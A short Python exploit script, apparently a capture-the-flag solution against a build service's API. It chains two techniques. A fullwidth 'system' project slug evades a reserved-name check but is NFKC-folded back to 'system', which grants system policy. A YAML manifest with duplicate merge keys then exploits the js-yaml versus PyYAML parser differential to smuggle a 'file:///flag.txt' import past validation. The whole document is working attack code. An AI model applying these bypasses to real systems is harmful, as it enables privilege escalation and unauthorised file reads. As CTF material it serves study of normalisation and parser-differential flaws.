import sys
import requests

url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost"

# fullwidth "system" slips past the reserved-name check, but the worker
# NFKC-folds it back to "system" and gives us the system policy
pid = requests.post(f"{url}/api/projects", json={"slug": "ｓｙｓｔｅｍ"}).json()["id"]

# two merge keys: js-yaml keeps the first, PyYAML keeps the last
manifest = """job:
  <<: {action: translate, source: "https://example.com/dict.json"}
  <<: {action: import, source: "file:///flag.txt"}
"""

r = requests.post(f"{url}/api/projects/{pid}/builds",
                  headers={"Content-Type": "text/yaml"}, data=manifest)
print(r.json()["artifact"])
